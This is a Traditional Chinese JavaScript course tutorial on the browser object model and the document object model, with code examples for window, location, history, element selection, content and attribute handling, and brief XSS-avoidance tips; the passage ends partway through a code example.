---
title: "[基礎課程] JavaScript 教學（三）：BOM 與 DOM"
categories:
  - 職訓教材
  - JavaScript
tag:
  - JavaScript 程式設計（假日班）
  - PHP 資料庫網頁設計（職前班）
  - 前端網頁開發技術（職前班）
  - JavaScript
  - 前端入門
date: 2025-08-03 21:07:53
---
![](assets/images/banner/js.png)

本篇 BOM（Browser Object Model，瀏覽器物件模型）與 DOM（Document Object Model，文件物件模型）。這兩個模型是 JavaScript 與網頁互動的基礎，掌握它們將讓您能夠動態控制網頁內容和瀏覽器行為。

<!-- more -->

# 什麼是 BOM 與 DOM？

在開始學習具體操作之前，我們需要先理解這兩個模型的基本概念：

## BOM（Browser Object Model）
BOM 是瀏覽器物件模型，它提供了 JavaScript 與瀏覽器本身互動的介面。透過 BOM，我們可以：
- 控制瀏覽器視窗
- 操作瀏覽器歷史記錄
- 獲取螢幕資訊
- 控制 URL 導向

{% mermaid graph TD %}
    subgraph BOM["瀏覽器物件模型 (BOM)"]
        Window["window 物件"]
        Window --> History["history 物件"]
        Window --> Location["location 物件"]
        Window --> Navigator["navigator 物件"]
        Window --> Screen["screen 物件"]
        Window --> Document["document 物件"]
    end
    style BOM fill:#e1f5fe,stroke:#0277bd,stroke-width:2px
{% endmermaid %}

## DOM（Document Object Model）
DOM 是文件物件模型，它將 HTML 文件結構化為一個樹狀結構，讓 JavaScript 能夠：
- 存取和修改 HTML 元素
- 改變元素的樣式和內容
- 響應用戶互動事件

{% mermaid graph TD %}
    subgraph BOM["瀏覽器物件模型 (BOM)"]
        Window["window 物件"]
        Window --> History["history 物件"]
        Window --> Location["location 物件"]
        Window --> Navigator["navigator 物件"]
        Window --> Screen["screen 物件"]
        Window --> Document["document 物件"]
    end
    
    subgraph DOM["文件物件模型 (DOM)"]
        Document --> HTML["html 元素"]
        HTML --> Head["head 元素"]
        HTML --> Body["body 元素"]
        Head --> Title["title<br/>網頁標題"]
        Body --> H1["h1<br/>主標題"]
        Body --> Div["div#container"]
        Div --> P["p<br/>段落文字"]
        Div --> Button["button<br/>按鈕"]
    end
    
    style BOM fill:#e1f5fe,stroke:#0277bd,stroke-width:2px
    style DOM fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
{% endmermaid %}

## 兩者的關係
- **BOM** 是瀏覽器的整體模型，`window` 物件代表瀏覽器視窗本身，是 BOM 的根物件，包含多項模型物件以及所有全域物件、函式和變數。BOM 提供了 JavaScript 與瀏覽器溝通的介面。
- **DOM** 是 BOM 的一部分，`document` 物件代表整個 HTML 文件，它是 DOM 的根物件。透過 DOM，我們可以存取和操作網頁中的所有 HTML 元素、屬性和內容。DOM 將 HTML 文件視為一個樹狀結構，每個元素都是樹中的一個節點，這使得我們能夠輕鬆地遍歷、修改和管理網頁內容
- 我們應該透過 `window.document` 來存取 DOM，但因為 window 是所有的 root，所以也可以直接使用 `document` 來存取

{% note info %}
**重要觀念：**
- BOM 控制瀏覽器行為（如開啟新視窗、導向頁面）
- DOM 控制網頁內容（如修改文字、改變樣式）
- 兩者配合使用，可以創造豐富的網頁互動體驗
{% endnote %}

# BOM 操作
瀏覽器物件模型（BOM）提供了豐富的操作介面，讓我們能夠控制瀏覽器的各種行為和功能。以下我們將介紹一些最常用且實用的 BOM 操作方法，這些方法可以幫助我們更好地掌握瀏覽器的互動能力。

## window 物件
`window` 是 BOM 的根物件，代表整個瀏覽器視窗。在瀏覽器環境中，全域變數和函式都屬於 `window` 物件。

```js
// 以下兩種寫法效果相同
console.log("Hello World");
window.console.log("Hello World");

// 全域變數實際上是 window 的屬性
let globalVar = "全域變數";
console.log(window.globalVar); // "全域變數"
```

window 物件還提供了許多實用的方法。

| 方法                                  | 描述           | 用途               |
| ------------------------------------- | -------------- | ------------------ |
| `window.scrollTo(x, y)`               | 滾動到指定位置 | 頁面導航、錨點跳轉 |
| `window.scrollBy(x, y)`               | 相對滾動       | 平滑滾動效果       |
| `window.print()`                      | 列印當前頁面   | 列印功能           |
| `window.focus()`                      | 讓視窗獲得焦點 | 視窗管理           |
| `window.blur()`                       | 讓視窗失去焦點 | 視窗管理           |
| `window.moveTo(x, y)`                 | 移動視窗位置   | 視窗定位           |
| `window.resizeTo(width, height)`      | 調整視窗大小   | 視窗尺寸控制       |
| `window.open(url, target, features)`  | 開啟新視窗     | 彈出視窗控制       |
| `window.close()`                      | 關閉視窗       | 視窗管理           |
| `window.alert(message)`               | 顯示提示對話框 | 用戶提示           |
| `window.confirm(message)`             | 顯示確認對話框 | 用戶確認           |
| `window.prompt(message, default)`     | 顯示輸入對話框 | 用戶輸入           |
| `window.setTimeout(callback, delay)`  | 延遲執行       | 計時器功能         |
| `window.setInterval(callback, delay)` | 重複執行       | 計時器功能         |
| `window.clearTimeout(id)`             | 取消延遲執行   | 計時器控制         |
| `window.clearInterval(id)`            | 取消重複執行   | 計時器控制         |
| `window.innerWidth`                   | 視窗內部寬度   | 響應式設計         |
| `window.innerHeight`                  | 視窗內部高度   | 響應式設計         |
| `window.outerWidth`                   | 視窗外部寬度   | 視窗管理           |
| `window.outerHeight`                  | 視窗外部高度   | 視窗管理           |

## 對話框 alert、confirm、prompt
請在瀏覽器控制台中逐一執行下述程式碼，觀察不同對話框的效果。

```js
// 基本提示框
alert("這是一個提示訊息");

// 確認對話框 - 回傳 true 或 false
let result = confirm("您確定要刪除這個項目嗎？");
if (result) {
    console.log("使用者選擇了確定");
} else {
    console.log("使用者選擇了取消");
}

// 輸入對話框 - 回傳使用者輸入的字串
let name = prompt("請輸入您的姓名：", "預設值");
if (name) {
    console.log("您好，" + name);
}
```

## 計時器 setTimeout、setInterval
計時器是 JavaScript 中非常重要的功能，它允許我們在指定的時間後執行程式碼，或者重複執行某些操作。這在製作動畫、自動更新內容等場景中非常有用。

```js
// setTimeout - 延遲執行
let timeoutId = setTimeout(function() {
    console.log("3 秒後執行");
}, 3000);

// clearTimeout - 取消延遲執行
clearTimeout(timeoutId);

// setInterval - 重複執行
let counter = 0;
let intervalId = setInterval(function() {
    counter++;
    console.log("計數：" + counter);
    
    if (counter >= 5) {
        clearInterval(intervalId); // 停止計時器
        console.log("計時器已停止");
    }
}, 1000);
```

{% note info %}
**計時器 ID 機制：**
- `setTimeout` 和 `setInterval` 都會回傳一個數字 ID
- 這個 ID 是由瀏覽器提供的唯一標記
- 使用 `clearTimeout(ID)` 或 `clearInterval(ID)` 可以取消對應的計時器
- 即使計時器已經執行完成，清除操作也不會出錯
{% endnote %}

## 視窗控制 open
視窗控制功能允許我們程式化地操作瀏覽器視窗，包括開啟新視窗、調整視窗大小等。不過需要注意的是，現代瀏覽器基於安全考量可能對這些功能有所限制。

```js
// 開啟新視窗
let newWindow = window.open("https://www.google.com", "_blank", "width=500,height=400");

// 關閉視窗
newWindow.close(); // 只能在同源視窗中使用

// 調整視窗大小
window.resizeTo(800, 600); // 現代瀏覽器可能限制此功能
```

{% note warning %}
**注意事項：**
- 基於安全考量，現代瀏覽器對某些 BOM 操作可能有限制
- 彈出視窗可能被瀏覽器阻擋
- 某些方法需要用戶互動才能執行
{% endnote %}

## location 物件
BOM 中處理 URL 和頁面導向的重要工具。它包含了當前頁面的完整 URL 資訊，並提供了豐富的方法來操作和導向頁面。無論是獲取當前頁面資訊還是進行頁面跳轉，`location` 物件都是不可或缺的。

```js
// 獲取當前 URL
console.log(location.href);

// 導向到新頁面 - 方法一：直接設定 href
location.href = "https://www.google.com";

// 導向到新頁面 - 方法二：使用 assign() 方法
location.assign("https://www.google.com");

// 導向到新頁面 - 方法三：使用 replace() 方法（替換當前頁面）
location.replace("https://www.google.com");

// 重新載入頁面
location.reload();

// 獲取 URL 各部分
console.log("協議：" + location.protocol); // https:
console.log("主機：" + location.host);     // www.example.com
console.log("路徑：" + location.pathname); // /page.html
```

{% note info %}
**location.href vs location.assign() vs location.replace()：**
- `location.href = "URL"`：直接設定 href 屬性
- `location.assign("URL")`：使用 assign() 方法導向
- `location.replace("URL")`：替換當前頁面，不新增歷史記錄
- `assign()` 和 `href` 都會在歷史記錄中新增一筆記錄
- `replace()` 會替換當前歷史記錄，無法使用「上一頁」回到原頁面
{% endnote %}

{% note warning %}
**實際應用場景：**
- **登入後導向**：使用 `assign()` 或 `href`，讓用戶可以回到登入頁面
- **錯誤頁面導向**：使用 `replace()`，避免用戶回到錯誤狀態
- **表單提交後**：通常使用 `replace()` 防止重複提交
{% endnote %}

location 物件還有一些實用的屬性。

| 屬性/方法                | 描述           | 用途         |
| ------------------------ | -------------- | ------------ |
| `location.href`          | 完整 URL       | URL 操作     |
| `location.protocol`      | 協議部分       | URL 解析     |
| `location.host`          | 主機+端口      | URL 解析     |
| `location.hostname`      | 主機名稱       | 域名檢測     |
| `location.port`          | 端口號         | 環境檢測     |
| `location.pathname`      | 路徑部分       | URL 解析     |
| `location.search`        | URL 查詢參數   | 參數解析     |
| `location.hash`          | URL 錨點部分   | 單頁應用路由 |
| `location.origin`        | 協議+主機+端口 | 同源檢測     |
| `location.assign(url)`   | 導向新頁面     | 頁面導航     |
| `location.replace(url)`  | 替換當前頁面   | 頁面導航     |
| `location.reload(force)` | 重新載入頁面   | 頁面刷新     |

## screen 物件
`screen` 物件提供了關於用戶螢幕的詳細資訊，包括螢幕尺寸、色彩深度、像素密度等。這些資訊在響應式設計、適配不同設備和優化用戶體驗時非常重要。

```js
// 螢幕尺寸資訊
console.log("螢幕寬度：" + screen.width);           // 螢幕實際寬度
console.log("螢幕高度：" + screen.height);          // 螢幕實際高度
console.log("可用寬度：" + screen.availWidth);      // 可用螢幕寬度（排除工作列）
console.log("可用高度：" + screen.availHeight);     // 可用螢幕高度（排除工作列）

// 色彩資訊
console.log("色彩深度：" + screen.colorDepth);      // 色彩深度（位元）
console.log("像素深度：" + screen.pixelDepth);      // 像素深度

// 方向資訊
console.log("螢幕方向：" + screen.orientation.type); // 螢幕方向（landscape/portrait）
```

{% note info %}
**screen 物件的應用場景：**
- **響應式設計**：根據螢幕尺寸調整佈局
- **設備適配**：為不同設備提供最佳體驗
- **性能優化**：根據螢幕能力調整內容品質
- **用戶體驗**：避免內容超出螢幕範圍
{% endnote %}

screen 物件還有一些實用的屬性。

| 屬性                 | 描述           | 用途     |
| -------------------- | -------------- | -------- |
| `screen.availLeft`   | 可用區域左邊距 | 視窗定位 |
| `screen.availTop`    | 可用區域上邊距 | 視窗定位 |
| `screen.colorDepth`  | 色彩深度       | 圖片品質 |
| `screen.pixelDepth`  | 像素深度       | 顯示品質 |
| `screen.orientation` | 螢幕方向       | 適配設計 |

## history 物件
能夠程式化地控制瀏覽器的前進、後退功能。這在製作單頁應用程式（SPA）或需要自訂導航行為的網頁中非常有用。透過 `history` 物件，我們可以實現更靈活的頁面導航體驗。

```js
// 回到上一頁
history.back();

// 前往下一頁
history.forward();

// 跳轉指定頁數（正數前進，負數後退）
history.go(-2); // 回到前兩頁
```

history 物件提供更多導航控制功能。

| 方法/屬性                                 | 描述         | 用途         |
| ----------------------------------------- | ------------ | ------------ |
| `history.back()`                          | 回到上一頁   | 瀏覽器導航   |
| `history.forward()`                       | 前往下一頁   | 瀏覽器導航   |
| `history.go(n)`                           | 跳轉指定頁數 | 瀏覽器導航   |
| `history.pushState(state, title, url)`    | 新增歷史記錄 | 單頁應用路由 |
| `history.replaceState(state, title, url)` | 替換歷史記錄 | 路由狀態管理 |
| `history.length`                          | 歷史記錄數量 | 導航狀態檢測 |
| `history.state`                           | 當前狀態     | 狀態管理     |

## 其他的物件與方法
除了前面介紹的核心物件外，BOM 還提供了許多其他有用的物件和方法。這些物件在特定場景下非常有用，值得了解它們的存在和基本用途。

### Console API
| 方法                              | 描述     | 用途     |
| --------------------------------- | -------- | -------- |
| `console.log(message, ...args)`   | 一般日誌 | 除錯輸出 |
| `console.warn(message, ...args)`  | 警告訊息 | 警告輸出 |
| `console.error(message, ...args)` | 錯誤訊息 | 錯誤輸出 |
| `console.table(data)`             | 表格輸出 | 資料展示 |
| `console.group(label)`            | 分組輸出 | 日誌組織 |
| `console.time(label)`             | 計時開始 | 性能測量 |
| `console.timeEnd(label)`          | 計時結束 | 性能測量 |

### navigator 物件
提供瀏覽器和系統的詳細資訊，常用於檢測瀏覽器類型和功能支援。

| 屬性/方法                 | 描述               | 用途                 |
| ------------------------- | ------------------ | -------------------- |
| `navigator.userAgent`     | 瀏覽器用戶代理字串 | 檢測瀏覽器類型和版本 |
| `navigator.language`      | 用戶偏好語言       | 國際化應用           |
| `navigator.onLine`        | 網路連線狀態       | 離線功能檢測         |
| `navigator.geolocation`   | 地理位置 API       | 位置服務             |
| `navigator.cookieEnabled` | Cookie 啟用狀態    | 功能檢測             |
| `navigator.platform`      | 作業系統平台       | 平台適配             |
| `navigator.vendor`        | 瀏覽器廠商         | 瀏覽器檢測           |
| `navigator.appName`       | 瀏覽器名稱         | 相容性檢測           |
| `navigator.appVersion`    | 瀏覽器版本         | 版本檢測             |

### localStorage 與 sessionStorage
提供客戶端儲存功能，用於保存用戶資料和應用狀態。

| 儲存類型         | 生命週期 | 用途                   |
| ---------------- | -------- | ---------------------- |
| `localStorage`   | 永久保存 | 用戶偏好設定、應用狀態 |
| `sessionStorage` | 會話期間 | 臨時資料、表單狀態     |

**常用方法：**
- `setItem(key, value)` - 儲存資料
- `getItem(key)` - 讀取資料
- `removeItem(key)` - 刪除資料
- `clear()` - 清除所有資料
- `key(index)` - 取得指定索引的鍵名
- `length` - 儲存項目數量

### Performance API
| 方法/屬性            | 描述         | 用途     |
| -------------------- | ------------ | -------- |
| `performance.now()`  | 高精度時間戳 | 性能測量 |
| `performance.memory` | 記憶體使用   | 性能監控 |
| `performance.timing` | 頁面載入時間 | 性能分析 |

{% note info %}
**使用建議：**
- 這些物件和方法在特定場景下非常有用
- 建議根據實際需求選擇合適的 API
- 注意瀏覽器相容性和安全限制
- 優先使用現代標準 API
- 常用方法建議熟記，不常用的可以查閱文件
{% endnote %}

# DOM 操作
DOM 將 HTML 文件表示為一個樹狀結構，每個 HTML 元素都是一個節點（Node）。透過這個結構，JavaScript 可以精確地找到並操作任何元素。

```html
<!DOCTYPE html>
<html>
<head>
    <title>網頁標題</title>
</head>
<body>
    <h1>主標題</h1>
    <div id="container">
        <p>段落文字</p>
        <button>按鈕</button>
    </div>
</body>
</html>
```

對應的 DOM 樹狀結構：

{% mermaid graph TD %}
    Document["document"]
    Document --> HTML["html"]
    HTML --> Head["head"]
    HTML --> Body["body"]
    Head --> Title["title<br/>網頁標題"]
    Body --> H1["h1<br/>主標題"]
    Body --> Div["div#container"]
    Div --> P["p<br/>段落文字"]
    Div --> Button["button<br/>按鈕"]
    
    style Document fill:#e8f5e8,stroke:#2e7d32,stroke-width:3px
    style HTML fill:#fff3e0,stroke:#f57c00,stroke-width:2px
    style Body fill:#fce4ec,stroke:#c2185b,stroke-width:2px
{% endmermaid %}

## DOM 元素選擇
在 DOM 操作中，第一步就是要找到我們想要操作的元素。JavaScript 提供了多種方法來選擇元素，每種方法都有其特定的使用場景和優缺點。掌握這些選擇方法是進行 DOM 操作的基礎。

DOM 中有多種節點類型：
- **元素節點**：HTML 標籤（如 `<div>`、`<p>`）
- **文字節點**：標籤內的文字內容
- **屬性節點**：HTML 屬性（如 `id`、`class`）

### getElementById
```html
<div id="myDiv">這是一個 div</div>
```

```js
// 透過 ID 選擇元素（回傳單一元素）
let element = document.getElementById("myDiv");
console.log(element); // <div id="myDiv">這是一個 div</div>
```

{% note primary %}
**素材準備：**
```html dom-basic.html
<!DOCTYPE html>
<html>
<head>
    <title>DOM 基礎練習</title>
</head>
<body>
    <h1 id="title">我的網頁</h1>
    <div id="container">
        <p class="text">第一段文字</p>
        <p class="text">第二段文字</p>
        <button id="btn">點擊我</button>
    </div>
    
    <script>
        // 在這裡練習 DOM 操作
    </script>
</body>
</html>
```
{% endnote %}

### getElementsByTagName
```js
// 選擇所有 p 標籤（回傳 HTMLCollection）
let paragraphs = document.getElementsByTagName("p");
console.log(paragraphs.length); // 2
console.log(paragraphs[0]); // 第一個 p 元素
```

### getElementsByClassName
```js
// 選擇所有 class 為 "text" 的元素（回傳 HTMLCollection）
let textElements = document.getElementsByClassName("text");
console.log(textElements.length); // 2
```

### getElementsByName
```html
<input type="text" name="username" value="使用者名稱">
```

```js
// 選擇所有 name 為 "username" 的元素
let inputs = document.getElementsByName("username");
console.log(inputs[0].value); // "使用者名稱"
```

### querySelector （推薦）
除了傳統的選擇方法，現代瀏覽器還支援更強大和靈活的 `querySelector` 方法。這些方法使用 CSS 選擇器語法，讓元素選擇變得更加直觀和強大。`querySelector` 系列方法是目前推薦使用的選擇方法。

```js
// 選擇第一個符合條件的元素 （返回 Element 物件）
let firstP = document.querySelector("p");
let title = document.querySelector("#title");
let textClass = document.querySelector(".text");

// 選擇所有符合條件的元素（回傳 NodeList）
let allTexts = document.querySelectorAll(".text");
let allButtons = document.querySelectorAll("button");
```

{% note info %}
**小技巧：**
- `querySelector` 使用 CSS Selector 語法，只回傳第一個符合的元素
- `querySelectorAll` 使用 CSS Selector 語法，回傳所有符合的元素
{% endnote %}

### DOM 選擇器返回值差異
不同的 DOM 選擇方法會返回不同類型的物件，了解這些差異對於正確操作 DOM 元素非常重要。

**返回值類型說明：**
| 選擇方法                 | 返回值類型           | 數量 | 更新機制 | 可用方法            |
| ------------------------ | -------------------- | ---- | -------- | ------------------- |
| `getElementById`         | Element 物件 或 null | 單一 | 靜態     | Element 方法        |
| `getElementsByTagName`   | HTMLCollection       | 多個 | 動態     | HTMLCollection 方法 |
| `getElementsByClassName` | HTMLCollection       | 多個 | 動態     | HTMLCollection 方法 |
| `querySelector`          | Element 物件 或 null | 單一 | 靜態     | Element 方法        |
| `querySelectorAll`       | NodeList             | 多個 | 靜態     | NodeList 方法       |

#### Element 物件
```js
// 返回 Element 物件的方法
const element1 = document.getElementById('myId');
const element2 = document.querySelector('.myClass');

console.log(element1); // Element 物件或 null
console.log(element2); // Element 物件或 null

// 可以直接操作
if (element1) {
    element1.textContent = '修改內容';
    element1.style.color = 'red';
    element1.addEventListener('click', function() {
        console.log('點擊事件');
    });
}
```

#### HTMLCollection
```js
// 返回 HTMLCollection 的方法
const elements1 = document.getElementsByTagName('p');
const elements2 = document.getElementsByClassName('text');

console.log(elements1); // HTMLCollection 物件
console.log(elements2); // HTMLCollection 物件

// 特點：動態更新
console.log(elements1.length); // 假設有 2 個元素

// 新增元素後，HTMLCollection 會自動更新
const newP = document.createElement('p');
document.body.appendChild(newP);
console.log(elements1.length); // 自動變成 3 個

// 只能使用數字索引存取
for (let i = 0; i < elements1.length; i++) {
    elements1[i].style.color = 'blue';
}
```

#### NodeList
```js
// 返回 NodeList 的方法
const elements = document.querySelectorAll('p');

console.log(elements); // NodeList 物件

// 特點：靜態集合，不會自動更新
console.log(elements.length); // 假設有 2 個元素

// 新增元素後，NodeList 不會更新
const newP = document.createElement('p');
document.body.appendChild(newP);
console.log(elements.length); // 仍然是 2 個

// 可以使用 forEach 方法
elements.forEach(element => {
    element.style.color = 'green';
});

// 也可以使用數字索引
for (let i = 0; i < elements.length; i++) {
    elements[i].style.fontSize = '16px';
}
```

#### HTMLCollection vs NodeList 差異
```js
// HTMLCollection - 動態更新範例
const dynamicElements = document.getElementsByTagName('div');
console.log('初始數量：', dynamicElements.length); // 假設 3 個

// 新增元素
const newDiv = document.createElement('div');
document.body.appendChild(newDiv);

console.log('新增後數量：', dynamicElements.length); // 自動變成 4 個

// NodeList - 靜態集合範例
const staticElements = document.querySelectorAll('div');
console.log('初始數量：', staticElements.length); // 假設 3 個

// 新增元素
const newDiv2 = document.createElement('div');
document.body.appendChild(newDiv2);

console.log('新增後數量：', staticElements.length); // 仍然是 3 個

// 需要重新查詢才能獲得更新後的結果
const updatedElements = document.querySelectorAll('div');
console.log('重新查詢後：', updatedElements.length); // 現在是 4 個
```

{% note warning %}
**重要提醒：**
- HTMLCollection 是動態的，會自動反映 DOM 的變化
- NodeList 是靜態的，DOM 變化後需要重新查詢
- 在迴圈中修改 DOM 時要特別注意這個差異
{% endnote %}

{% note info %}
**最佳實踐：**
- 現代開發推薦使用 `querySelector` 系列方法
- 需要動態更新時考慮使用 `getElementsBy*` 方法
- 在複雜的 DOM 操作中，重新查詢比依賴動態更新更安全
{% endnote %}

### 使用 document 子物件
除了透過選擇方法存取元素外，`document` 物件還提供了一些快速直接存取的子物件，這些物件代表 HTML 文件中的重要結構元素。

| document. 子物件   | 描述                                                            |
| ------------------ | --------------------------------------------------------------- |
| `document.head`    | head 元素，但唯獨屬性不可修改                                   |
| `document.body`    | body 元素，操作例如`document.body.style.backgroundColor="red";` |
| `document.forms`   | 文件內的全部表單元素之通用集合                                  |
| `document.links`   | 文件內的全部具備 href 之元素之通用集合                          |
| `document.images`  | 文件內的全部 img 元素之通用集合                                 |
| `document.scripts` | 文件內的全部 script 元素之通用集合                              |

**返回值類型說明：**

| document. 子物件   | 返回值類型     | 特點                 |
| ------------------ | -------------- | -------------------- |
| `document.head`    | Element 物件   | 單一元素，可直接操作 |
| `document.body`    | Element 物件   | 單一元素，可直接操作 |
| `document.forms`   | HTMLCollection | 動態集合，會自動更新 |
| `document.links`   | HTMLCollection | 動態集合，會自動更新 |
| `document.images`  | HTMLCollection | 動態集合，會自動更新 |
| `document.scripts` | HTMLCollection | 動態集合，會自動更新 |

```js
// 直接存取 document 子物件
console.log(document.head); // head 元素
console.log(document.body); // body 元素

// 操作 body 樣式
document.body.style.backgroundColor = "lightblue";

// 存取所有表單
console.log(document.forms.length); // 表單數量
console.log(document.forms[0]); // 第一個表單

// 存取所有連結
console.log(document.links.length); // 連結數量
console.log(document.links[0].href); // 第一個連結的 href

// 存取所有圖片
console.log(document.images.length); // 圖片數量
console.log(document.images[0].src); // 第一張圖片的 src

// 存取所有腳本
console.log(document.scripts.length); // 腳本數量
```

{% note info %}
**document 子物件的特點：**
- 這些是 `document` 物件的直接屬性，無需使用選擇方法
- 提供了快速存取常用元素的方式
- `document.head` 和 `document.body` 返回 Element 物件，可直接操作
- `document.forms`、`document.links`、`document.images`、`document.scripts` 返回 HTMLCollection，具有動態更新特性
- 在實際開發中非常實用
{% endnote %}

## DOM 元件操作

找到元素後，下一步就是對元素進行操作。DOM 提供了豐富的方法來讀取和修改元素的內容、屬性和樣式。這些操作是動態網頁開發的核心，讓我們能夠創造豐富的用戶體驗。

### 內容操作 (innerHTML, textContent)
兩種不同的內容操作方式，各有其特點和使用場景：

| 特性      | innerHTML              | textContent    |
| --------- | ---------------------- | -------------- |
| HTML 標籤 | 會解析並渲染           | 視為純文字顯示 |
| 執行效率  | 較慢（解析 HTML 渲染） | 較快           |
| 安全性    | 需注意 XSS 風險        | 較安全         |
| 使用場景  | 需要 HTML 結構時       | 純文字內容時   |

```js
// demo > 內容操作
// --------------------------------------------------
let element = document.getElementById("title");

// 讀取內容
console.log(element.innerHTML); // "我的網頁"
console.log(element.textContent); // "我的網頁"

// 修改內容
element.innerHTML = "<em>新的標題</em>"; // 支援 HTML 標籤
element.textContent = "純文字標題"; // 只支援純文字

// 動態添加內容
let container = document.getElementById("container");
container.innerHTML += "<p>新添加的段落</p>";
```

{% note info %}
**使用建議：**
- 需要動態插入 HTML 結構時使用 `innerHTML`
- 只需要處理純文字時使用 `textContent`
- 處理使用者輸入時優先使用 `textContent` 避免 XSS 風險
{% endnote %}

### 屬性操作
可以直接透過 JavaScript 來操作 HTML 元素的屬性。這包括讀取、修改、檢查與刪除屬性。本節也會釐清「DOM 屬性（property）」與「HTML 屬性（attribute）」的差異，並重點說明 `getAttribute()` 與 `setAttribute()` 的使用情境。

#### 常用 API 與基本示例
```js
// demo > HTML 元素屬性：基本操作
// --------------------------------------------------
const element = document.getElementById("title");

// 讀取屬性（DOM 屬性 property）
console.log(element.id);          // "title"
console.log(element.className);   // 如有 class 會回傳字串

// 讀取屬性（HTML 屬性 attribute）
console.log(element.getAttribute("id"));    // 以標記上的原始字串為準
console.log(element.getAttribute("class")); // 以標記上的原始字串為準（可能與當前計算後不同）

// 設定屬性
element.className = "new-class";                       // 設定 DOM 屬性（通常也會反映到 attribute）
element.setAttribute("data-custom", "自訂屬性值");   // 設定自訂資料屬性（attribute）

// 檢查與移除屬性
console.log(element.hasAttribute("data-custom")); // true/false
element.removeAttribute("data-custom");
```

#### property vs attribute 的差異
- property：JavaScript 物件屬性，反映「當下的狀態」。型別可能是字串、數字、布林等。
- attribute：HTML 原始標記上的字串值，通常是「初始設定」。多數但非全部 attribute 會對應到 property（稱為 reflected attribute）。

```js
// demo > 差異示例：input 的 value 與 checked
// --------------------------------------------------
const input = document.querySelector("input[type='text']");
const checkbox = document.querySelector("input[type='checkbox']");

// value：property 會隨使用者輸入變動；attribute 保留初始字串
input.setAttribute("value", "A");   // 設定初始值（標記層）
input.value = "B";                   // 改變目前值（執行時狀態）
console.log(input.getAttribute("value")); // "A"
console.log(input.value);                 // "B"

// checked（布林屬性）：attribute 有無即代表 true/false，property 直接是布林
checkbox.setAttribute("checked", ""); // 只要存在就代表 true（字串內容通常不重要）
checkbox.checked = false;                // 以執行時狀態覆寫
console.log(checkbox.hasAttribute("checked")); // true（仍存在）
console.log(checkbox.checked);                // false（當前狀態）
```

```js
// demo > href/src 類屬性：property 可能回傳「正規化後」的值
// --------------------------------------------------
const link = document.querySelector("a");
link.setAttribute("href", "../docs/page.html");
console.log(link.getAttribute("href")); // "../docs/page.html"（原始字串）
console.log(link.href);                  // 可能是絕對網址，如 "https://site.com/docs/page.html"
```

#### data-* 與 dataset
- 以 `setAttribute('data-xxx', '值')` 或使用 `element.dataset.xxx = '值'`
- `dataset` 以駝峰命名對應，例如 `data-user-id` ⇄ `dataset.userId`

```js
// demo > 操作 data-* 屬性
// --------------------------------------------------
const card = document.querySelector(".card");
card.setAttribute("data-user-id", "123");
console.log(card.getAttribute("data-user-id")); // "123"

card.dataset.role = "admin";              // 等同於 setAttribute('data-role', 'admin')
console.log(card.dataset.role);            // "admin"
```

{% note warning %}
**布林屬性注意：** `disabled`、`checked`、`required` 等建議用「property」布林切換，如 `element.disabled = true/false`。用 `setAttribute('disabled', '')` 只是在標記上加上屬性，與執行時狀態可能不同步。
{% endnote %}

#### 何時用 property，何時用 get/setAttribute？
- 使用 property（如 `id`、`value`、`checked`、`className`、`classList`）：
  - 需要操作「執行時狀態」或布林屬性
  - 需要方便的 API 與型別安全（非全為字串）
- 使用 `getAttribute`/`setAttribute`：
  - 操作 `data-*`、`aria-*` 或非反映到 property 的自訂屬性
  - 需要取得「原始標記」字串（如 `href` 原始寫法、大小寫）
  - 大量動態組合屬性字串（例如 `setAttribute('style', cssText)`）

```js
// demo > class 與 style 的差別操作
// --------------------------------------------------
const box = document.querySelector(".box");

// class 建議：classList / className
box.classList.add("active");
box.className = "card active";

// style：若要部分修改，優先用 property；要一次覆蓋才用 setAttribute('style', ...)
box.style.backgroundColor = "#fee";
box.setAttribute("style", "color:#333; padding:12px;"); // 覆蓋整個 style 屬性
```

{% note info %}
**小技巧：** `hasAttribute(name)` 可用來檢查 attribute 是否存在；`removeAttribute(name)` 用以移除指定屬性。`getAttribute(name)` 找不到時回傳 `null`，請記得判斷。
{% endnote %}

{% note danger %}
**安全性提醒：** 避免用 `setAttribute('onclick', '...')` 這類事件屬性綁定事件，容易造成 XSS 風險。請使用 `element.addEventListener()`。
{% endnote %}

#### 常見的 classList 操作
`classList` 提供便捷的類別管理 API，適合做狀態切換、條件套用與多類別增減。

```js
// demo > classList 常見操作
// --------------------------------------------------
const box = document.querySelector('.box');

// add/remove：可一次處理多個 class
box.classList.add('active', 'highlight');
box.classList.remove('highlight');

// toggle：沒有第二參數時，會在有/無之間切換
box.classList.toggle('open');

// toggle(force)：用布林強制加入/移除（不會依現況翻轉）
const isMobile = window.matchMedia('(max-width: 768px)').matches;
box.classList.toggle('compact', isMobile);

// contains：檢查是否已有某個 class
if (!box.classList.contains('active')) {
  box.classList.add('active');
}

// replace：以新 class 取代舊 class
box.classList.replace('active', 'is-active');
```

{% note info %}
**建議用法：** 處理單一/多個類別的增減與狀態切換時，優先使用 `classList`；需要完整覆蓋全部類別時，才使用 `element.className = '...'` 或 `setAttribute('class', '...')`。
{% endnote %}

#### 其他常見屬性操作
以下整理幾組常見但容易忽略的屬性操作情境：

```js
// demo > 通用方法：toggleAttribute / hasAttributes / getAttributeNames
// --------------------------------------------------
const el = document.querySelector('#panel');

// 直接切換布林屬性（存在=on，不存在=off）
el.toggleAttribute('hidden');        // 在顯示/隱藏之間切換
el.toggleAttribute('hidden', false); // 強制移除（顯示）

console.log(el.hasAttributes());       // 是否有任意屬性
console.log(el.getAttributeNames());   // 取得所有屬性名稱陣列
```

```js
// demo > tabindex：屬性 vs 屬性值型別
// --------------------------------------------------
const card = document.querySelector('.card');
card.setAttribute('tabindex', '-1'); // attribute（字串）
card.tabIndex = 0;                   // property（數字），可參與自然鍵盤導航
```

```js
// demo > 無障礙（ARIA）與 role
// --------------------------------------------------
const toggleBtn = document.querySelector('#toggle');
// 以 ARIA 反映狀態給協助工具
const pressed = toggleBtn.getAttribute('aria-pressed') === 'true';
toggleBtn.setAttribute('aria-pressed', String(!pressed));
// 補上語意（若非 <button> 元素）
toggleBtn.setAttribute('role', 'button');
```

```js
// demo > 布林屬性：hidden / disabled
// --------------------------------------------------
const input = document.querySelector('#name');
input.disabled = true;                 // 建議用 property 切換
// 或使用 attribute 的切換語法
input.toggleAttribute('disabled', false);
```

```js
// demo > 連結安全性與使用者體驗
// --------------------------------------------------
const link = document.querySelector('a[target="_blank"]');
link.setAttribute('rel', 'noopener noreferrer'); // 避免反向操作與安全風險
```

```js
// demo > 圖片載入與可存取性
// --------------------------------------------------
const img = document.querySelector('img.hero');
img.alt = '活動主視覺：夏季特賣';
